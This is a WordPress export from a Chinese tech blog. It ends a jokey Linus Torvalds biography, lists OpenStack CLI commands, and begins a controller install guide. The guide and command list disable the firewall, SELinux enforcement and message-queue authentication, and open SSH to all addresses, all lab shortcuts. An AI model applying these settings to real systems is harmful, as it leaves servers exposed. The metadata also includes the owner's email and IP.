当时这份报纸的读者大概有一半人有 H1 经历，然后这一半人里的一半都知道 Linux 是啥东东，但是从未听说过 Transmeta 是何方神圣，这货居然把一代技术英雄扣在那儿为一个名不见经传的小资本家作苦力，导制全球开源事业停滞不前，真是胆大包天啊！于是很多读者跑到水星报去说，象李纳斯这样的天才愿意移民到美国，布什亲自开飞机去接都不为过，怎么可以被移民局压了五年呢balabala……
</div>

<p class="text">还好，李纳斯在2003年离开了这个叫做「全美达」的公司，受聘于开放源代码开发实验室（OSDL : Open Source Development Labs, Inc），重新统领开源世界的各路英豪，全力开发 Linux 内核，Linux 再次焕发出勃勃生机，这一次，它要引领的是互联网的技术浪潮……</p>

<p class="text"><strong>Linus（七）——关于财富</strong></p>

<p class="text">李纳斯对待财富的态度就是「视金钱为粪土」，是真的粪土。</p>

<p class="text">那种默然的态度让人感觉非常可怕。当一个人随便动动手挂挂名签个字就能获取上千万美金的时候，他依然和自己的妻女一家人挤在圣克拉拉一栋两层楼的公寓套房里，过着一个普通程序员的生活，同时不断改进已经遍布全球的 Linux，这是什么精神？这是毫不利己专门利人的国际主义战士的精神。</p>

<p class="text">写到这我不禁想起了绿茵场上的冰王子博格坎普，当他接到几十米外的长传，用标志性的慢速停球过掉扑上来的后卫，轻扣，过掉另一个后卫，颠球，闪过最后的防守，面对守门员的时候不是大力抽射和仰天长啸，而是把球搓出一道完美的抛物线，球越过门将，缓缓落入网窝，然后博格坎普，低着头慢慢的走开，留给对手的是优雅与实用并世无双的技艺，和令人绝望的背影！</p>

<p class="text">默然的感觉，懂了撒？</p>

<p class="text">很多程序员创业成功或跟随创业成功之后，自以为功成身退，最早扔掉的就是代码和编译器，然后购豪宅当天使满世界贴旅游照片，你们感受一下，这个境界是完全不可同日而语的。（请勿对号入座，如有误伤，必是友军所为）</p>

<p class="text">事实上李纳斯在拿到第一笔真正的财富之前，一直处于日子紧巴巴的状态。当时另两位带头大哥比尔·盖茨和史蒂夫·乔布斯早已名满天下家私万贯，同时有大量的技术人员、商人和公司通过 Linux 及其相关技术获取了巨额财富，对此，李纳斯的态度是：「和我有毛关系」，他似乎对一大群才气不高的编程人员能够享受到大笔的财富并不在意。这种情况一直持续到所有的有识之士都坐不住了：李纳斯，你再也不能这样下去了！</p>

<p class="text">伦敦的一位企业家希望李纳斯在他羽翼未丰的 Linux 公司做个董事会成员，报酬是一千万美金。李纳斯说，不用。企业家惊呆了，当他喃喃自语「卧槽你特么知道一千万美金是啥概念吗」的时候，李纳斯已默默走远。</p>

<p class="text">Red Hat 公司为了感谢李纳斯的卓越贡献，为他提供了一些期权，李纳斯的回复同样是，不用了，我不会给你独家的授权许可的。Red Hat 的人差点疯掉：「李爷期权您就收着吧，我们什么都不要行了吧」「唔这样啊，那就放这吧」，这就是李纳斯！</p>

<p class="text">正是这笔期权让李纳斯收获了第一笔巨额财富，因为 Red Hat 1999年8月11日在纳斯达克上市了。李纳斯先是意识到自己从身无分文突然变成了拥有五十万美元的土豪，然后是一百万，五百万，李纳斯终于变得亢奋起来，原来期权也是钱啊！终于不用再为生计发愁了，对着这个事情，李纳斯的定义是：我真是最幸运的家伙！</p>

<p class="text">事实上李纳斯从来没有想过 Linux 能够获得如此巨大的成功。他只是为了自己方便写了一个操作系统内核并想借此获得一点回报而已，「假如我事先知道了要做到如 Linux 这般成功需要做多少基础和琐碎工作的话，那我肯定会相当沮丧的。这意味着你首先要非常优秀，并且你所做的大部分决定都导致了正确的结果。」</p>

<p class="text">任何理智的人在登山之前凝望着高耸入云的山峰和崎岖艰险的山路时，都会陷于沮丧之中。解决办法就是先迈出第一步再说，然后，但行好事，莫问前程。</p>

<p class="text">Linux 不仅给李纳斯带来了名声和财富，同时给大众带去了巨大的好处。年轻一代中最聪明的程序员和黑客都在使用 Linux 的产品，正是开放的 Linux 给这些天才的程序员带去了巨大的创作热情和喜悦，他们在 Linux 平台上完成了一个又一个杰出的作品，这些技术形成的生产力，对互联网的发展起到了巨大的推动作用，直到今天。</p>

<p class="text"><strong>Linus（八）——巨星碰撞</strong></p>

<p class="text">在 Linux 出现之前，桌面操作系统的市场基本上是由比老师和乔老师控制的，虽然乔老师控制的少了一些。Linux 出现之后，桌面操作系统的格局并没有太大变化，但是服务器端市场的变化却是翻天覆地的。原本比尔希望通过 Windows NT 和 Server 系列在服务器领域复制桌面操作系统的辉煌，从而千秋万载，一统江湖。然而，世界的发展永远是多元的，没人能通过一己之力改变历史发展的多维性，比尔·盖茨也不行。于是 Linux 出现了，并以星星之火可以燎原之势一举拿下服务器操作系统的半壁江山。</p>

<p class="text">一方是商业公司和封闭的策略，另一方是自由软件和开放的协议，这场战争一开始支持率就是一边倒的，李纳斯就像对抗风车的堂·吉诃德，但是他自己不仅没有遍体鳞伤，还在没怎么亲自出场的情况下把微软这个软件风车搞得狼狈不堪，这种情况发生在现实生活中绝对是老百姓喜闻乐见的，李纳斯成了自由软件世界里的英雄和领袖，但也就此与微软结下了世仇，比尔和李纳斯许下了永世不相见的誓言。</p>

<p class="text">有些加盟微软的朋友告诉李纳斯，他们曾见到他的头像被钉在了微软公司的飞镖靶心上。李纳斯对此的评价是：一定是我的大鼻子太好瞄准了。</p>

<p class="text">李纳斯与另一位业界巨头苹果之间就没这么激进了，毕竟 Linux 和 OS X 师出同门，都是从老前辈 Unix 那儿毕业的，坐在一起还能唠唠家常，事实上李纳斯和乔布斯确实有过一次历史性的会面。</p>

<p class="text">李纳斯来到硅谷不久，就收到了一封来自乔老师秘书的邮件，邮件中写到：「听闻小李飞刀光临硅谷，蓬荜生辉，老乔不才，重回苹果，以期振昔日之雄风，如得小李相助，必将如猛虎加之羽翼而翱翔四海，天下可得。期待会面。」（当然是意译）</p>

<p class="text">李纳斯看完之后不明白乔布斯要干什么，只是觉得很厉害的样子。毕竟李纳斯还坐在外公腿上拨弄电脑键盘的时候，苹果的沃兹已经纯手动打造出苹果的第一代个人电脑 Apple I 了。李纳斯决定去见一下儿时的偶像，并了解一下苹果的新操作系统。</p>

<p class="text">两代科技巨星的会面被安排在苹果总部 Infinity Loop，乔布斯带着原 Next 公司技术总监 Avie Tevanian（Mach 之父）接见了李纳斯，双方进行了友好而亲切的会谈，然后会谈的结果和某国常规会谈一样，就是没有结果。</p>

<p class="text">其时乔布斯十年放逐回归苹果，举手投足已是大宗师气势，他对李纳斯说，我大苹果虽然现在看起来有点颓，不过海盗精神永存，我们已经准备好重新起航了。目前个人电脑领域仍然只有两个玩家：微软和苹果。如果 Linux 和苹果能够珠联璧合，那一切将是最好的安排，所有的开源爱好者都能够用上优雅与极客并存的 MacLinux 了。然后 Mach 之父 Avie Tevanian 向李纳斯详细介绍了整合 Mach 和 Linux 内核作为 OS X 混合内核的计划，之后庞大的 OS X 体系将构建在 Mach 和 Linux 内核的基础之上。 同时乔老师表示，基于 Mach 和 Linux 的内核系统将采用开源的方式运作，这样全世界的开源爱好者都可以为 Mac 和 Linux 开发程序。</p>

<p class="text">这几乎是一个完美的双赢方案，乔老师都被自己描绘的蓝图打动了，永远年轻，永远他妈的热泪盈眶！谁能拒绝苹果公司和乔布斯如此完美的邀请呢？</p>

<p class="text">李纳斯能！</p>

<p class="text">乔布斯认为自己的扭曲现实力场加上苹果巨大的市场潜力一定会让李纳斯怦然心动，没想到这个芬兰小子在计算机面前待久了，水米油盐不进，任凭乔布斯口吐莲花，我自巍然不动。首先李纳斯对 Mach 就不感冒，他认为 Mach 几乎犯下了所有的设计错误，它让系统变得复杂而效率低下；其次李纳斯觉得乔布斯可能没意识到，Linux 的潜在用户要比苹果系统多；第三李纳斯乐观的认为，虽然 Linux 的目标不是占领桌面操作系统，但是显然「我们很快就能做到这一点了」。所以李纳斯当时的反应是：</p>

<div class="quote">
为什么我要关心这些？我为什么要对苹果公司的故事感兴趣？我不觉得苹果公司里有什么有趣的事情。我的目标也不是占领什么桌面操作系统的市场。（嗯，虽然 Linux 马上就要做到这点了，但这从来就不是我的目标）
</div>

<p class="text">现在看来，李纳斯当时对 Linux 在桌面操作系统的前景过于乐观了，虽然他天纵奇才桀骜不驯，但是也无法预测到 OS X 和 iOS 在十年后引领移动开发的浪潮。不过即使知道 OS X 未来的大发展，心高气傲的李纳斯也不会接受苹果的收编，因为 Linux 一直是独立和自由的软件图腾。</p>

<p class="text">无论如何，这次非正式的会谈没有达成任何实质性的效果，但是对后来的 IT 格局产生了巨大的影响。苹果不再关注 Linux，而是转向了 BSD。2001年苹果任命 FreeBSD 的发起人之一，老牌 BSD 黑客 Jordan Hubbard 为 BSD 技术经理，后升为 Unix 技术总监，负责 OS X 操作系统底层核心 Darwin 的研发，最终，Mach 与 BSD 技术整合在一起，形成了混合内核。另外，苹果开始觉得开源项目也不是那么靠谱，后续他们先后研发并开源了优秀的编译器项目 LLVM 和 Clang，一举替换了整条 GCC 编译链，为 OS X 和 iOS 的性能优化和语言特性提供了巨大的帮助。这也算是苹果对那些牛叉哄哄的开源人士的回击：看，我们也可以做开源，而且比你们做的好。</p>

<p class="text">Linux 则继续在开源、独立、自由的方式下一路狂奔，虽然在桌面操作系统领域的成就乏善可陈，但是在服务器端大放异彩，目前几乎整个互联网都是运行在 Linux 及其衍生产品之上的，可以说没有 Linux，互联网不可能得到如此迅猛的发展。</p>

<p class="text">十年以后，移动互联网时代来临。OS X 上长出了 iOS，Linux 上则诞生了 Android，这两个移动开发领域的双子星都有一个老祖宗，那就是 Unix。一次话不投机的会谈让 OS X 和 Linux 分道扬镳，在十几年后的今天，它们又以一种不同的方式相见了，世界永远都是多元的，可能冥冥中自有天意吧。</p>

<p class="text"><strong>Linus（九）——Linus 和 Git</strong></p>

<p class="text">很多人在完成了类似 Linux 这样宏伟的软件产品之后，基本上就止步不前了。但是李纳斯却从未停歇创新的脚步。2003年加入开放源代码开发实验室之后，李纳斯重新全职投入 Linux 内核的研发，并开始酝酿自己的另一个跨时代的产品。</p>

<p class="text">2002年，Linux 内核开发团队开始采用 BitKepper 作为代码版本管理工具。BitKeeper 是一套分布式的版本管理工具，它满足了 Linux 内核开发的技术需求。但是 BitKeeper 只是暂时对 Linux 等开源软件团队免费，并不是自由软件。2005年 BitMover 公司不再免费赞助 Linux 开发团队。对此李纳斯表示非常遗憾，但遗憾之后他并没有自怨自艾伤心落泪，而是愤怒的与其他几个小伙伴花了几个星期完成了一套新的分布式代码管理工具，命名为 Git。两个月之后，Git 发布了官方版本，并在不同的项目中应用，自由软件社区给予了 Git 广泛的支持。</p>

<p class="text">与 SVN 和 CVS 等软件不同的是，Git 更关注文件的整体性是否有改变，Git 更像一个文件系统，它允许开发者在本地获取各种数据，而不是随时都需要连接服务器。Git 的最大的特点就是离线分布式代码管理，速度飞快，适合管理大型项目，难以置信的非线性分支管理。</p>

<p class="text">2005年 Git 发布之后，技术日臻成熟，很多大公司都开始采用 Git 管理自己的项目代码，2008年2月 Github 公司基于 Git 构建了协作式源代码托管网站 Github，目前该网站是这个星球上最大的源代码集散地，几乎所有的优秀代码都托管在 Github 上。Git 已经成为程序员使用最多的源代码管理工具！</p>

<p class="text">对于 Git 的成功，李纳斯表示：</p>

<div class="quote">
Git的设计其实很简单，它有一个稳定而合理的数据结构。事实上，我强烈建议围绕着数据来设计代码，而不是反其道而行之，我觉得这可能就是 Git 如此成功的原因。坏程序员总是担心他们的代码，而优秀的程序员则会担心数据结构和它们之间的关系。
</div>

<p class="text">从 Git 诞生到今天已经有9个年头了，Git 始终没有背离其设计的初衷：高性能、简单的设计、非线性高并发分支的支持和完全的分布式。</p>

<p class="text">对于李纳斯来说，Git 现在是他的主要消遣工具之一。他很喜欢在 Git 上编程的感觉，因为再也不用担心锁定问题、安全问题和网络问题，这种感觉真是太美妙了！</p>

<p class="text">我们继续期待李纳斯的第三个伟大的作品！</p>

<p class="text"><strong>Linus（十）——生活的意义</strong></p>

<p class="text">李纳斯认为生活意义的全部就在于：生存，社会交往和寻找乐趣。因为我们所做的一切事情，最终似乎都是为了我们自己的乐趣。而进化作为主线始终贯穿其中。</p>

<p class="text">李纳斯对进化的理解是：</p>

<div class="quote">
「你知道在整个太阳系，人类已知的最复杂的工程是什么吗？——不是Linux，不是Solaris，也不是你的汽车。是你，还有我。想想你和我都是怎么来的——不是什么超复杂的设计，没错，凭运气。除了运气，还有：
通过分享「源代码」实现自由的可用性和授粉机制，生物学家把它称作DNA。
毫不手软的用户环境把我们不好的版本轻易地替换成更好的可执行版本，从而使种群更加优秀（生物学家把这叫做「适者生存」）。
大量的无方向的并行开发（试错法）。
我从未如此严肃过：我们人类永远都无法复制出比我们自身更复杂的个体，而自然选择却不假思索的做到了。不要低估适者生存的力量。不要错误地认为你可以做出比大量的平行试错反馈环更好的设计，那样就太抬举你的智力水平了。说实话，太阳照常升起，这和任何人的工程技巧或者编程风格都没有关系。
</div>

<p class="text">李纳斯一生只为寻找欢笑，但是他却取得了无数的成就和荣誉：</p>

<p class="text">1997年，在芬兰赫尔辛基大学计算机科学系，李纳斯接受了他的硕士学位。两年后，他在斯德哥尔摩大学接受名誉博士学位，并在2000年在他的母校获得了同样的荣誉。</p>

<p class="text">1998年，李纳斯接受了电子前哨基金会先锋奖。</p>

<p class="text">2004年，李纳斯被《时代》杂志选为世界上最有影响力的人之一。</p>

<p class="text">2006年，《时代》杂志欧洲版评选李纳斯为过去60年最有革命性的英雄人物之一。</p>

<p class="text">2012年4月20日，李纳斯被宣布成为两位获奖者之一，和山中伸弥共同获得当年的千禧技术奖。该奖被普遍形容为相当于在技术领域的诺贝尔奖。</p>

<p class="text">2012年4月23日，李纳斯进入互联网协会（Internet Society，ISOC）的网络名人堂。</p>

<p class="text">李纳斯憎恶分明，经常口不择言，比如他对 C++的评价是：C++是一门糟糕的语言。而且有一群不合格的程序员在使用C++，他们让它变得更糟糕了。他对自己的两个产品命名的解释是：我是个自大的混蛋，我所有的项目都以我的名字来命名。开始是Linux， 然后是Git（英国俚语，饭桶的意思）。</p>

<p class="text">不过我最喜欢李纳斯说过的一句话是：Talk is cheap, Show me the code。他一直用自己的编程人生诠释着这句话。2006年的时候，Linux 内核代码的2%依然是李纳斯完成的，他是代码贡献最多的人之一（是年37岁）。到了2012年，他对内核的贡献主要是合并代码，编程变少了，但是他依然对是否将新代码并入到 Linux 内核具有最终决定权。</p>

<p class="text">李纳斯用自己精彩的编程人生和对自由软件的热爱演绎了现代社会中一个书呆子的胜利。如果你爱一个人，就让他去编程吧；如果你恨一个人，就让他去编程吧。代码让我们欢笑，也让我们忧伤，让我们沉默，也让我们高歌。对于程序员来说，代码是这个世界上最美妙的音乐，会编程的孩子，都是好孩子！</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>359</wp:post_id>
		<wp:post_date><![CDATA[2015-11-30 23:40:11]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-11-30 15:40:11]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[linus%ef%bc%8c%e4%b8%80%e7%94%9f%e5%8f%aa%e4%b8%ba%e5%af%bb%e6%89%be%e6%ac%a2%e7%ac%91]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="git"><![CDATA[Git]]></category>
		<category domain="post_tag" nicename="linus"><![CDATA[Linus]]></category>
		<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e8%b6%a3%e9%97%bb"><![CDATA[趣闻]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[166]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>openstack的常用命令</title>
		<link>https://www.nervgeek.com/2015/12/10/openstack%e7%9a%84%e5%b8%b8%e7%94%a8%e5%91%bd%e4%bb%a4/</link>
		<pubDate>Thu, 10 Dec 2015 10:09:15 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=411</guid>
		<description></description>
		<content:encoded><![CDATA[1、查看rabbitmq 队列：rabbitmqctl list_queues
2、查看keystone的用户：keystone user-list
3、查看keystone endpoint：keystone endpoint-list
4、查看keystone的role：keystone role-list
5、查看keystone 服务：keystone service-list
6、查看keystone租户：keystone tenant-list
7、查看租户情况：keystone tenant-get ID
8、查看keystone进程：ps -ef | grep -i keystone-all
9、查看日志是否有错误：grep ERROR /var/log/keystone/keystone.log
<!--more-->
上传imageglance：
add name="Ubuntu 12.04 cloudimg amd64" is_public=true container_format=ovf \
disk_format=qcow2 &lt; /root/precise-server-cloudimg-amd64-disk1.img
10、查看image：glance index
11、nova 命令查看image：nova image-list
12、查看image具体信息(ID是通过 glance index 查看获得）：glance show ID
13、查看nova 服务：nova-manage service list
14、创建密钥：nova keypair-add oskey &gt; oskey.priv
chmod 600 oskey.priv
15、申请floating IP：nova floating-ip-create
16、安全组相关命令：
nova secgroup-add-rule default tcp 22 22 0.0.0.0/0  ---设置虚拟机能ssh
nova secgroup-add-rule default icmp -1 -1 0.0.0.0/0  ---设置虚拟机能ping icmp包
nova secgroup-list
nova secgroup-list-rules default
17、查看虚拟机配置种类：nova flavor-list
18、创建虚拟机（一个test的虚拟机）：
nova boot --flavor 2 --key_name oskey --image ea3ffba1-065e-483f-bfe2-c84184ee76be test1
19、完整创建一个虚拟机的流程：
nova keypair-add oskey &gt; oskey.priv
chmod 600 oskey.priv
nova flavor-list
nova image-list
nova boot --flavor 2 --key_name oskey --image ea3ffba1-065e-483f-bfe2-c84184ee76be test1
nova secgroup-add-rule default tcp 22 22 0.0.0.0/0
nova secgroup-add-rule default icmp -1 -1 0.0.0.0/0
20、查看申请flating IP 列表：nova floating-ip-list
21、查看虚拟机：nova list
22、添加floating IP给虚拟机（id是虚拟机的ID，通过nova list获得）：
nova add-floating-ip  7eb1d4b3-13fa-4e39-be17-3a27eb0db218 10.1.199.33
23、查看虚拟机的floating IP （nova list，就可以查看，需要等待1分钟）：nova list
24、ssh到虚拟机上 （ubuntu的虚拟机，默认的用户名是ubuntu，只能用密钥登陆）：
ssh -i oskey.priv ubuntu@192.168.22.2
25、删除flating IP （ID就是虚拟机ID，通过 nova list 获得）：
nova remove-floating-ip ID 10.1.199.33
26、删除虚拟机：nova delete ID
27、创建10G的volumenova：volume-create --display_name "test volume" 10
28、查看nova volume情况：nova volume-list
29、把volume添加到虚拟机上( ID是虚拟机的id，后面的1，是volume的ID）添加完后可以通过 nova volume-list查看结果：
nova volume-attach 7eb1d4b3-13fa-4e39-be17-3a27eb0db218 1 /dev/vdc
30、查看虚拟机里的volume情况（登陆虚拟机里）：
ubuntu@test1:~$ cat /proc/partitions
major minor  #blocks  name
253        0   10485760 vda
253        1   10474380 vda1
253       16   20971520 vdb
253       32   10485760 vdc
31、删除volume：nova volume-detach VM_ID Volume_ID
32、创建snapshot ( 完成后可以通过 nova image-list 查看）：
nova image-create 7eb1d4b3-13fa-4e39-be17-3a27eb0db218 "snapshot 1"
33、虚拟机重启，停止：
nova suspend ac9e6a9f-58c3-47c3-9b4c-485aa421b8a8
nova resume ac9e6a9f-58c3-47c3-9b4c-485aa421b8a8
nova reboot ac9e6a9f-58c3-47c3-9b4c-485aa421b8a8
34、迁移虚拟机：nova live-migration &lt;server ID&gt; &lt;destination compute&gt;
35、挂载快存储到虚拟机：nova volume-attach &lt;server&gt; &lt;volume&gt; &lt;device&gt;
36、基于kvm的也可以使用virsh list查看实例
root@compute1:/var/lib/nova/instances# virsh list]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>411</wp:post_id>
		<wp:post_date><![CDATA[2015-12-10 18:09:15]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-12-10 10:09:15]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[openstack%e7%9a%84%e5%b8%b8%e7%94%a8%e5%91%bd%e4%bb%a4]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="openstack"><![CDATA[OpenStack]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[1308]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>13</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.5]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-12-29 23:34:35]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-12-29 15:34:35]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[评论测试]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>14</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.5]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-12-29 23:34:55]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-12-29 15:34:55]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[嵌套测试]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>13</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>15</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.5]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-12-30 18:36:57]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-12-30 10:36:57]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[二层嵌套测试]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>14</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>16</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.5]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-12-30 18:37:07]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-12-30 10:37:07]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[三层嵌套测试]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>15</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>17</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.5]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-12-30 18:37:14]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-12-30 10:37:14]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[四层嵌套测试]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>16</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					</item>
					<item>
		<title>先电OpenStack v1.2 - IaaS平台Controller节点搭建配置（脚本版）</title>
		<link>https://www.nervgeek.com/2015/12/30/%e5%85%88%e7%94%b5openstack-v1-2-iaas%e5%b9%b3%e5%8f%b0%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%ef%bc%88%e8%84%9a%e6%9c%ac%e7%89%88%ef%bc%89/</link>
		<pubDate>Wed, 30 Dec 2015 11:34:16 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=437</guid>
		<description></description>
		<content:encoded><![CDATA[<h2 style="text-align: center;"><strong>Controller安装</strong></h2>

<strong>前提：修改eth0、eth1的ip（只能有一张网卡设置网关，建议设置外网网关）；selinux修改为permissive，并执行setenforce 0，然后重启服务器；修改hosts，添加controller和compute的内网ip；把iso拷进controller内并分别挂载到opt新建的centos、icehouse、paas文件夹。</strong>
<strong>设置源：</strong>

<table width="874">
<tbody>
<tr>
<td width="437">[centos]
name= centos
baseurl=file:///opt/centos/
enabled=1
gpgcheck=0</td>
<td width="437">[icehouse]
name= icehouse
baseurl=file:///opt/icehouse/iaas-repo/
enabled=1
gpgcheck=0</td>
</tr>
</tbody>
</table>

<!--more-->
&nbsp;
<strong>一、安装vsftpd、qpid、ntp服务</strong>
1、安装服务

<pre>yum install vsftpd qpid-cpp-server ntp</pre>

&nbsp;
2、设置ntp开机启动

<pre>chkconfig ntpd on</pre>

&nbsp;
3、修改ftp默认匿名路径为opt

<pre>vi /etc/vsftpd/vsftpd.conf</pre>

添加：

<pre>anon_root=/opt</pre>

&nbsp;
4、修改ntp，把controller成为ntp Server

<pre>vi /etc/ntp.conf</pre>

添加：

<pre>server 127.127.1.0
fudge 127.127.1.0       stratum 10</pre>

&nbsp;
5、修改qpid配置文件

<pre>vi /etc/qpidd.conf</pre>

将最后一行<span style="color: #ff0000;">auth=yes</span>修改为<span style="color: #ff0000;">auth=no</span>
&nbsp;
6、关闭防火墙

<pre>service iptables stop</pre>

&nbsp;
7、设置开机启动和开机关闭

<pre>chkconfig iptables off
</pre>

<pre>chkconfig ntpd on
</pre>

<pre>chkconfig httpd on
</pre>

<pre>chkconfig vsftpd on
</pre>

<pre>chkconfig qpidd on
</pre>

&nbsp;
